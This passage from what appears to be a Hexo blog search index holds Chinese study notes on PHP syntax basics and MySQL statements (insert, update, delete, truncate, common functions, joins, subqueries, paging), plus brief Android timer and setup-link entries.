错误抑制符：@(可能出错的表达式)，在PHP中有一些错误可以提前预知，但又不想报错，这就需要错误抑制符。$g = 0;echo $f % $g; // 此时会报错echo @($f % $g); // 不会报错// 三目运算符(问号表达式) 表达式1 ？ 表达式2：表达式3echo $g ==0?1:2;</code></pre><h1 id="四-流程控制"><a href="#四-流程控制" class="headerlink" title="四.流程控制"></a>四.流程控制</h1><p>1.完全和C相同,唯一要注意的就是变量名要记得加上$<br>2. 嵌入到html中的时候语法会有变化<br><a href="https://imgchr.com/i/Duks0A" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/Duks0A.png" alt=""></a><br><a href="https://imgchr.com/i/Dukrmd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/Dukrmd.png" alt="结果"></a></p><h1 id="五-文件包含"><a href="#五-文件包含" class="headerlink" title="五.文件包含"></a>五.文件包含</h1><p>1.include ‘文件名’:相当于把文件里的代码加进去,类似于C<br>2.include_once ‘文件名’:<br>3.require:和include相同<br>include会执行多次，导致报错（重复定义变量）。。而include_once不会出现这种情况。<br>require和include区别在于：若未包含文件，则报错形式不一样。（require包含错误文件，则include后不l<br>再执行；include未包含文件，会警告，但是仍会执行后面的。</p><h1 id="六"><a href="#六" class="headerlink" title="六."></a>六.</h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql基础———增添语句</title>
      <link href="/2020/11/18/sql-ji-chu-zeng-shan-gai/"/>
      <url>/2020/11/18/sql-ji-chu-zeng-shan-gai/</url>
      
        <content type="html"><![CDATA[<h1 id="一-插入语句"><a href="#一-插入语句" class="headerlink" title="一.插入语句"></a>一.插入语句</h1><h2 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h2><p>语法：insert into 表名（列名，…） values（值1，…）</p><p>示例1：插入的值的类型要与列的类型一致或兼容</p><pre class=" language-SQL"><code class="language-SQL">INSERT INTO beauty (  id,  NAME,  sex,  borndate,  phone,  photo,  boyfriend_id) VALUES  (    13,    '唐艺昕',    '女',    '1990-4-23',    '18934531234',    NULL,    2  );</code></pre><p>案例二:可以省略列名，默认所有列，而且列的顺序和表中列的顺序一致</p><pre class=" language-SQL"><code class="language-SQL">INSERT INTO beautyVALUES(18, '李易峰', '男', NULL, '19', NULL, NULL);</code></pre><h2 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h2><p>语法：insert into 表名 set 列名=值，列名=值</p><pre class=" language-SQL"><code class="language-SQL">INSERT INTO beauty SET id = 19,NAME = '刘涛',phone = '999' ;</code></pre><p>方式1支持插入多行，但是方式2不支持</p><pre class=" language-SQL"><code class="language-SQL">INSERT INTO beautyVALUES(20, '李易峰', '男', NULL, '19', NULL, NULL),(21, '李易峰', '男', NULL, '19', NULL, NULL),(22, '李易峰', '男', NULL, '19', NULL, NULL);</code></pre><p>方式1支持子查询，方式2不支持</p><pre class=" language-SQL"><code class="language-SQL">INSERT INTO beauty(id, NAME, phone)SELECT 26, '送钱', '12341234';</code></pre><h1 id="二-修改语句"><a href="#二-修改语句" class="headerlink" title="二.修改语句"></a>二.修改语句</h1><p>语法:</p><ul><li>修改单表:<pre class=" language-SQL"><code class="language-SQL">update 表名</code></pre></li></ul><p>set 列=新值，列=新值…</p><pre><code>* 修改多表:```SQLsql92语法：update 表1 别名，表2 别名set 列=值…where 筛选条件and 筛选条件；sql99语法：update 表1 别名inner | left | right join 表2 别名on 连接条件set 列=值，…where 筛选条件；</code></pre><p>案例1：修改boys表中id号位2的名称为张飞，魅力值为10</p><pre class=" language-SQL"><code class="language-SQL">UPDATE    boys SET  boyname = '张飞',  usercp = 10 WHERE id = 2 ;</code></pre><p>案例二:(多表查询)</p><pre class=" language-SQL"><code class="language-SQL">UPDATE  boys b   INNER JOIN beauty be     ON b.`id` = be.`boyfriend_id` SET be.`phone` = '114' WHERE b.`boyName` = '张无忌' ;</code></pre><h1 id="三-删除语句"><a href="#三-删除语句" class="headerlink" title="三.删除语句"></a>三.删除语句</h1><h2 id="方式一-delete"><a href="#方式一-delete" class="headerlink" title="方式一(delete):"></a>方式一(delete):</h2><p>语法:</p><ul><li>单表的删除<pre class=" language-SQL"><code class="language-SQL">delete from 表名 where 筛选条件</code></pre></li><li>多表的删除<pre class=" language-SQL"><code class="language-SQL">sql92语法</code></pre></li></ul><p>delete 别名（要删哪个表就写哪个表的别名，都删就都写）</p><p>from 表1 别名，表2 别名</p><p>where 连接条件</p><p>and 筛选条件</p><p>limit 条目数；</p><pre><code>```SQLsql99语法delete 别名（要删哪个表就写哪个表的别名，都删就都写）from 表1 别名inner | left | right join 表2 别名 on 连接条件where 筛选条件limit 条目数；</code></pre><p>案例1：删除手机号以9结尾的女神信息</p><pre class=" language-SQL"><code class="language-SQL">DELETE FROM  beauty WHERE phone LIKE '%9' ;</code></pre><p>案例2：删除黄晓明的信息以及他女朋友的信息</p><pre class=" language-SQL"><code class="language-SQL">DELETE   b,  be FROM  beauty be   INNER JOIN boys b     ON b.`id` = be.`boyfriend_id` WHERE b.`boyName` = '黄晓明' ;</code></pre><h2 id="方式2-truncate"><a href="#方式2-truncate" class="headerlink" title="方式2(truncate):"></a>方式2(truncate):</h2><p>语法:</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">truncate</span> <span class="token keyword">table</span> 表名；</code></pre><p><strong><em>注1:truncate语句中不许加where</em></strong> </p><p><strong><em>注2:一删全删</em></strong><br>案例:</p><pre class=" language-SQL"><code class="language-SQL">TRUNCATE TABLE boyes ;</code></pre><h2 id="delete和truncate的区别"><a href="#delete和truncate的区别" class="headerlink" title="delete和truncate的区别"></a>delete和truncate的区别</h2><ul><li><p>delete可以加where条件，truncate不可以</p></li><li><p>truncate删除效率高一些</p></li><li><p>假如要删除的表中有自增长列，如果用delete删除后，再插入数据，自增长列的<br>值从断点开始，而truncate删除后，再插入数据，自增长列的值从1开始。</p></li><li><p>truncate删除没有返回值，delete删除有返回值</p></li><li><p>truncate删除不能回滚，delete删除可以回滚</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql基础———常见函数</title>
      <link href="/2020/11/18/sql-ji-chu-chang-jian-han-shu/"/>
      <url>/2020/11/18/sql-ji-chu-chang-jian-han-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-字符函数"><a href="#1-字符函数" class="headerlink" title="1.字符函数"></a>1.字符函数</h2><ul><li>concat(x1,x2，***,xn)：连接参数</li><li>length(x)：获取参数值的字节个数</li><li>upper(xx)/lower(xx)：把参数变大小写</li><li>substr(str,begin)：第一个参数是一个字符串,第二个参数是从截取从第begin个位置*以及后面全部的字符</li><li>substr(str,begin,end):截取从begin到end(包括end位置)的字符</li><li>instr(str1,str2):返回str2的第一次出现在str1中的索引(第一个字母的位置)  </li><li>trim(str):取消字符串中的空格</li><li>trim(xx from 字符串)：把在字符串中的xx全部去掉</li><li>lpad(str1,n,str2):用指定字符str2来填充str1的左边,让总字符数凑满n个,如果n小于str1的长度,则按照n从str1的左边往右截断,即输出1到n总中的字符</li><li>rpad：同理</li><li>replace(str,x1,X2) ：把str中的x1用x2代替<br>注意:myslq中1表示的就是第一个字符</li></ul><h2 id="2-数学函数"><a href="#2-数学函数" class="headerlink" title="2.数学函数"></a>2.数学函数</h2><ul><li>round：四舍五入</li><li>ceil：向上取整，返回&gt;=该参数的最小整数</li><li>floor：向下取整，返回&lt;=该参数的最大整数</li><li>truncate：截断，小数点后截断到几位</li><li>mod：取余，被除数为正，则为正；被除数为负，则为负</li><li>rand：获取随机数，返回0-1之间的小数</li></ul><h2 id="3-日期函数"><a href="#3-日期函数" class="headerlink" title="3.日期函数"></a>3.日期函数</h2><ul><li>now：返回当前系统日期+时间</li><li>curdate：返回当前系统日期，不包含时间</li><li>curtime：返回当前时间，不包含日期</li><li>可以只取出年月日小时分钟秒 比如 year(now</li><li>str_to_date：将日期格式的字符转换成指定格式的日期  </li><li>date_format：将日期转换成字符串<pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> STR_TO_DATE<span class="token punctuation">(</span><span class="token string">'3-1998-2'</span><span class="token punctuation">,</span> <span class="token string">'%c-%Y-%d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#输出结果： 1988-03-02</span><span class="token comment" spellcheck="true">#两个参数的格式样相同！,左边的符号右边也要有</span></code></pre></li></ul><p>SELECT<br>  DATE_FORMAT(NOW(), ‘%Y年%m月%d日)’);<br>#输出当前xxxx年xx月xx日<br>#第一个参数的时间要是一个正常的时间,比如DATE_FORMAT(‘01-2020-02’, ‘%m月%Y年/%d日)’);就会返回NULL</p><pre><code>[![占位符](https://s3.ax1x.com/2020/11/12/BvLCTI.png)](https://imgchr.com/i/BvLCTI)## 4.其他函数* SELECT VERSION(); 当前数据库服务器的版本* SELECT DATABASE();    当前打开的数据库* SELECT USER();        当前用户* password('字符');       返回该字符的密码形式* md5('字符');            也是加密的一种形式（MD5）## 5.流程控制函数* IF(条件,条件为true输出的内容,条件为false输出的内容)```sqlSELECT   last_name,  commission_pct,  IF(    commission_pct IS NULL,    '没奖金，呵呵',    '有奖金，嘻嘻'  ) 备注 FROM  employees ;</code></pre><ul><li>case的用法：<pre class=" language-SQL"><code class="language-SQL">#使用一case 要判断的字段或表达式when 常量1 then 要显示的值1或语句1;when 常量2 then 要显示的值2或语句2;...else 要显示的值n或语句n;end</code></pre></li></ul><p>#使用二<br>case<br>when 条件1 then 要显示的值1或语句1<br>when 条件2 then 要显示的值2或语句2<br>…<br>else 要显示的值n或语句n<br>end</p><h1 id="注意如果when后面加语句的话记得加分号"><a href="#注意如果when后面加语句的话记得加分号" class="headerlink" title="注意如果when后面加语句的话记得加分号"></a>注意如果when后面加语句的话记得加分号</h1><pre><code>案例(对应两种不同的用法)```sqlSELECT   salary AS 原始工资,  department_id,  CASE    department_id     WHEN 30     THEN salary * 1.1     WHEN 40     THEN salary * 1.2     WHEN 50     THEN salary * 1.3     ELSE salary   END AS 新工资 FROM  employees ; SELECT   salary,  CASE    WHEN salary &gt; 20000     THEN 'A'     WHEN salary &gt; 15000     THEN 'B'     WHEN salary &gt; 10000     THEN 'C'     ELSE 'D'   END AS 工资级别 FROM  employees ;  </code></pre><h2 id="6-分组函数-统计"><a href="#6-分组函数-统计" class="headerlink" title="6.分组函数(统计)"></a>6.分组函数(统计)</h2><ul><li>sum(xx)/avg(xx):求和,求平均 (一般用于处理数值型数据)</li><li>max/min:求最值 (可以处理任何类型数据)</li><li>count(xx):计数   </li><li><strong>注意:以上分组函数都忽略null值,和分组函数一同查询的字段有限制，要求是group by后的字段*</strong><br>提示:sum,avg,count等函数可以和DISTINCT一起用<br>比如:<pre class=" language-SQL"><code class="language-SQL">SELECT  SUM(DISTINCT salary), SUM(salary) FROM employees ;</code></pre></li></ul><h3 id="count的特殊介绍："><a href="#count的特殊介绍：" class="headerlink" title="count的特殊介绍："></a>count的特殊介绍：</h3><p><strong><em>使用count(\</em>) 统计一共有多少行*</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">FROM</span> employees<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> employees<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> employees<span class="token punctuation">;</span></code></pre><p>效率上：</p><ul><li>MYISAM存储引擎下，count(*)的效率高</li><li>INNODB存储引擎下，count(*)和count(1)效率差不多，比count(字段)要高一些</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pytouch学习笔记</title>
      <link href="/2020/11/17/pytouch-xue-xi-bi-ji/"/>
      <url>/2020/11/17/pytouch-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 神经网络 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> Pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql基础(一)-查询语句</title>
      <link href="/2020/11/10/sql-ji-chu-yi-cha-xun-yu-ju/"/>
      <url>/2020/11/10/sql-ji-chu-yi-cha-xun-yu-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="一-查询语句"><a href="#一-查询语句" class="headerlink" title="一.查询语句"></a>一.查询语句</h1><h2 id="1-基础查询"><a href="#1-基础查询" class="headerlink" title="1.基础查询"></a>1.基础查询</h2><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">.</span>查询表中某一字段：<span class="token keyword">select</span> 字段名 <span class="token keyword">from</span> 表名<span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">.</span>查询表中多个字段：<span class="token keyword">select</span> 字段名<span class="token punctuation">,</span>字段名 <span class="token keyword">from</span> 表名<span class="token punctuation">;</span>  <span class="token punctuation">(</span>字段名用逗号隔开<span class="token punctuation">)</span>  <span class="token number">3</span><span class="token punctuation">.</span>查询表中所有字段: <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 表名</code></pre><h2 id="2-进阶查询"><a href="#2-进阶查询" class="headerlink" title="2.进阶查询"></a>2.进阶查询</h2><pre class=" language-sql"><code class="language-sql">    <span class="token keyword">select</span> 字段名 <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> 筛选条件<span class="token punctuation">;</span></code></pre><p>筛选条件大致有如下这些,其中</p><p><a href="https://imgchr.com/i/BbDWsx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BbDWsx.png" alt="条件查询的条件类型"></a><br>1.&lt;&gt;表示的是不等于<br>2.通配符：<br>① %：表示可以匹配任意多个字符包括0个</p><p>② _：表示可以匹配的任意一个字符</p><p>③ \：表示转字字符</p><p><strong><em>注意：ESCAPE ‘X’可以用来自定义转义字符,比如 where name like ‘<em>$</em>‘;,这个句子表示把$定义为转义字符，那么这句的条件是 第二个字符为x第一个字符任意的数据</em></strong></p><p>3.</p><ul><li>like xx:表示查询的字段值里有xx表达式所表示的内容 </li><li>between xx and yy:在xx和yy之间</li><li>in [‘xx’,’yy’]：和参数列表中字符串格式完全相同的值</li><li>is null ：判断是否为空 (=和&lt;&gt;不能判断null)</li><li>&lt;=&gt;null：安全等于(可读性差,既可以判断null也可以判断普通数值)</li></ul><h2 id="3-排序查询"><a href="#3-排序查询" class="headerlink" title="3.排序查询"></a>3.排序查询</h2><p>语法</p><pre><code> select xx from 表名 where 筛选条件 order by 排序列表 [asc|desc]  order by x1 ASC,x2 DESC 表示按照x1升序再按照x2降序</code></pre><p>特点： </p><ul><li>支持按照多字段排序</li><li>默认升序(ASC)</li><li>排序列表内可以放表达式,函数，单个字段,多个字段</li></ul><h2 id="4-分组查询"><a href="#4-分组查询" class="headerlink" title="4.分组查询"></a>4.分组查询</h2><p>作用：将表中的数据按照不同类型分组(比如相同部门中的最高工资)<br>语法：</p><pre class=" language-SQL"><code class="language-SQL">select 分组函数，列（要求出现在group by的后面）from 表【where 筛选条件】group by (可以放多个字段)分组的列表【having 分组后的筛选】【order by 子句】</code></pre><p>注:sql语句的顺序有严格要求,不要自己随便写<br>案例:查询邮箱中包含a字符的，每个部门的平均工资<br>group by会把department_id相同的人的数据整合在一起</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>   <span class="token function">AVG</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span><span class="token punctuation">,</span>  department_id <span class="token keyword">FROM</span>  employees <span class="token keyword">WHERE</span> email <span class="token operator">LIKE</span> <span class="token string">'%a%'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> department_id <span class="token punctuation">;</span></code></pre><p>having的用法：<br>添加分组后的筛选用having，分组前的用where<br>举例:查询每个工种有奖金的员工的最高工资&gt;12000的工种编号和最高工资</p><pre class=" language-SQL"><code class="language-SQL">SELECT   MAX(salary) AS 最高工资,  job_id FROM  employees WHERE commission_pct IS NOT NULL GROUP BY job_id HAVING 最高工资 &gt; 12000 ;#已经按照id对最高工资进行分组了,然后再用having进行分组后的帅选</code></pre><ul><li>分组查询支持多个字段,两个字段要对应的时候分为一组</li></ul><h2 id="5-连接查询"><a href="#5-连接查询" class="headerlink" title="5.连接查询"></a>5.连接查询</h2><p>关于连接查询可以看这个链接中的例子会更直观  </p><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询  </p><p><a href="https://imgchr.com/i/DPslAU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPslAU.png" alt="连接方式"></a></p><h3 id="一-内连接"><a href="#一-内连接" class="headerlink" title="一.内连接"></a>一.内连接</h3><h4 id="一-sql192标准"><a href="#一-sql192标准" class="headerlink" title="一.sql192标准"></a>一.sql192标准</h4><p>注1:当没有有效连接(比如没有条件的时候)的时候会发生笛卡尔乘积现象</p><p>注2：可以通过表名.字段名的形式来具体定义</p><hr><ul><li><p>等值连接（有个等号）<br>案例一:匹配女生对应的男朋友(等值连接)</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>boyname <span class="token keyword">FROM</span>boys<span class="token punctuation">,</span>beauty    <span class="token keyword">WHERE</span> beauty<span class="token punctuation">.</span>boyfriend_id <span class="token operator">=</span> boys<span class="token punctuation">.</span>id <span class="token punctuation">;</span></code></pre></li><li><p>非等值连接(不相等)<br>案例二：查询员工的工资和工资级别</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> salary<span class="token punctuation">,</span>grade_level <span class="token keyword">FROM</span>employees <span class="token number">e</span><span class="token punctuation">,</span>job_grades g <span class="token keyword">WHERE</span> salary <span class="token operator">BETWEEN</span> g<span class="token punctuation">.</span>lowest_sal <span class="token operator">AND</span> g<span class="token punctuation">.</span>highest_sal <span class="token punctuation">;</span></code></pre></li><li><p>自连接(自己的表连接自己)<br>案例三：查询员工名和上级的名称</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token number">e</span><span class="token punctuation">.</span>employee_id<span class="token punctuation">,</span><span class="token number">e</span><span class="token punctuation">.</span>last_name<span class="token punctuation">,</span>m<span class="token punctuation">.</span>employee_id<span class="token punctuation">,</span>m<span class="token punctuation">.</span>last_name <span class="token keyword">FROM</span>employees <span class="token number">e</span><span class="token punctuation">,</span>employees m <span class="token keyword">WHERE</span> <span class="token number">e</span><span class="token punctuation">.</span><span class="token punctuation">`</span>manager_id<span class="token punctuation">`</span> <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token punctuation">`</span>employee_id<span class="token punctuation">`</span> <span class="token punctuation">;</span></code></pre></li></ul><hr><h4 id="二-sql99语法"><a href="#二-sql99语法" class="headerlink" title="二.sql99语法"></a>二.sql99语法</h4><p><a href="https://imgchr.com/i/DPgNGD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPgNGD.png" alt="sql99语法"></a><br><strong>* 注2:连接查询必须两张表有相同元素然后以相同元素为连接条件进行连接表(没有的话得用联合查询)  *</strong><br><strong><em>注1:这里on和where的作用是on先进行一次筛选再进行where筛选</em></strong></p><ul><li>1、 on条件(连接条件)是在生成临时表时使用的条件，它不管on中的条件是否为真，都会返回左边表中的记录。</li><li>2、where条件(过滤条件)是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有left join的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li></ul><hr><ul><li>inner(两表交集)<br>注:用inner进行多表查询的时候连接条件是有顺序要求的<br>案例一:查询名字中包含e的给员工名和工种名<pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> last_name<span class="token punctuation">,</span>job_title <span class="token keyword">FROM</span>employees <span class="token number">e</span> <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> jobs j   <span class="token keyword">ON</span> <span class="token number">e</span><span class="token punctuation">.</span><span class="token punctuation">`</span>job_id<span class="token punctuation">`</span> <span class="token operator">=</span> j<span class="token punctuation">.</span><span class="token punctuation">`</span>job_id<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> last_name <span class="token operator">LIKE</span> <span class="token string">"%e%"</span> <span class="token punctuation">;</span></code></pre>案例二:(多表查询)<br>注:on的连接条件必须要带上当前插入表的数据<pre class=" language-SQL"><code class="language-SQL">SELECT last_name,department_name,job_title FROMemployees e INNER JOIN departments d   ON e.`department_id` = d.`department_id` INNER JOIN jobs j   ON e.`job_id` = j.`job_id` ORDER BY d.`department_id` DESC ;</code></pre></li></ul><pre><code>* 非等值连接(改一下on的条件即可)  案例:```SQLSELECT   salary,  grade_level FROM  employees e   INNER JOIN job_grades g     ON e.`salary` BETWEEN g.`lowest_sal`     AND g.`highest_sal` ;</code></pre><ul><li>自连接(同理略)</li></ul><hr><h3 id="二-外连接"><a href="#二-外连接" class="headerlink" title="二.外连接"></a>二.外连接</h3><p><a href="https://imgchr.com/i/DPIWb4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/15/DPIWb4.png" alt="外连接特性"></a></p><ul><li>左外连接(join左边为主表,和从表没有匹配的数据值为null)<br>案例一:查询没有男朋友的女神名<pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token number">b</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>bo<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">FROM</span>beauty <span class="token number">b</span> <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> boys bo   <span class="token keyword">ON</span> <span class="token number">b</span><span class="token punctuation">.</span>boyfriend_id <span class="token operator">=</span> bo<span class="token punctuation">.</span>id <span class="token keyword">WHERE</span> bo<span class="token punctuation">.</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token operator">IS</span> <span class="token boolean">NULL</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">#on条件连接女神男朋友,有匹配就连接,没有就NULL</span><span class="token comment" spellcheck="true"># a LEFT JOIN B， A在左B在右</span></code></pre>结果:<br><a href="https://imgchr.com/i/DPIkNR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/15/DPIkNR.png" alt="案例一没有where条件时的结果"></a></li><li>右外连接(同理略)</li><li>全外连接(略)</li></ul><h1 id="6-子查询"><a href="#6-子查询" class="headerlink" title="6.子查询"></a>6.子查询</h1><p>简单来说就是查询的嵌套而已,子查询语句用括号括起来<br><a href="https://imgchr.com/i/DZ701g" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/17/DZ701g.png" alt="概念"></a></p><p>案例1：查询员工编号最少并且工资最高的员工信息(where多个条件)</p><pre class=" language-SQL"><code class="language-SQL">SELECT   * FROM  employees WHERE (employee_id, salary) =   (SELECT     MIN(employee_id),    MAX(salary)   FROM    employees) ;</code></pre><h1 id="7-分页查询"><a href="#7-分页查询" class="headerlink" title="7.分页查询"></a>7.分页查询</h1><p>应用场景：当要显示的数据，一页显示不全，需要分页提交sql请求<br>语法（重点在limit）:</p><pre class=" language-SQL"><code class="language-SQL">select 查询列表from 表【join type】 join 表2on 连接条件where 筛选条件group by 分组字段having 分组后的筛选order by 排序的字段】limit offset，size；offset：要显示条目的起始索引（从0开始）size：要显示的条目个数</code></pre><p><strong><em>公式：<br>要显示的页数page，每页的条目数size<br>select 查询列表<br>from 表<br>limit （page - 1）</em> size， size；*</strong></p><p>案例1：查询第11条-第25条</p><pre class=" language-SQL"><code class="language-SQL"></code></pre><h1 id="8-联合查询"><a href="#8-联合查询" class="headerlink" title="8.联合查询"></a>8.联合查询</h1><p>union：联合，合并，将多条查询语句的结果合并成一个结果  </p><p><strong><em>注:结果集的字段名按照前者的来选，两个表的元素的是一一对应关系，比如name就插在boyname后面,如果把name和id对换的话就会变成id插在boyname下面</em></strong></p><p>案例:把女生和男生和id和名字分别在同一列输出</p><pre class=" language-SQL"><code class="language-SQL">SELECT id,boyName FROM boysUNION SELECT id,NAMEFROM beauty;</code></pre><p>结果:<br><a href="https://imgchr.com/i/DeX3sU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/18/DeX3sU.png" alt="结果"></a></p><h1 id="10-查询总结"><a href="#10-查询总结" class="headerlink" title="10. 查询总结"></a>10. 查询总结</h1><p>语法(包括代码的执行顺序):</p><pre class=" language-SQL"><code class="language-SQL">语法：select 查询列表 7from 表1 别名 1连接类型 join 表2 2on 连接条件 3where 筛选 4group by 分组列表 5having 筛选 6order by 排序列表 8limit 排序列表 9</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境搭建问题</title>
      <link href="/2020/11/09/huan-jing-da-jian-wen-ti/"/>
      <url>/2020/11/09/huan-jing-da-jian-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>1.phpstudy的Mysql无法连接的解决方案<br><a href="https://blog.csdn.net/aokuiyu1635/article/details/101973758?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">https://blog.csdn.net/aokuiyu1635/article/details/101973758?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Handler实现定时器效果</title>
      <link href="/2020/11/08/handler-shi-xian-ding-shi-qi-xiao-guo/"/>
      <url>/2020/11/08/handler-shi-xian-ding-shi-qi-xiao-guo/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/sinat_30058101/article/details/51774916?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.channel_param" target="_blank" rel="noopener">https://blog.csdn.net/sinat_30058101/article/details/51774916?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.channel_param</a></p><pre><code>1，首先创建一个Handler对象   Handler handler=new Handler();  2，然后创建一个Runnable对Runnable runnable=new Runnable(){     @Override     public void run() {      // TODO Auto-generated method stub      //要做的事情，这里再次调用此Runnable对象，以实现每两秒实现一次的定时器操作      handler.postDelayed(this, 2000);     }  };  3，使用PostDelayed方法，两秒后调用此Runnable对象  handler.postDelayed(runnable, 2000);  4，如果想要关闭此定时器，可以这样操作handler.removeCallbacks(runnable);  </code></pre><p>具体的UI这里不赘述了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>App后台自动运行的方法</title>
      <link href="/2020/11/08/app-hou-tai-zi-dong-yun-xing-de-fang-fa/"/>
      <url>/2020/11/08/app-hou-tai-zi-dong-yun-xing-de-fang-fa/</url>
      
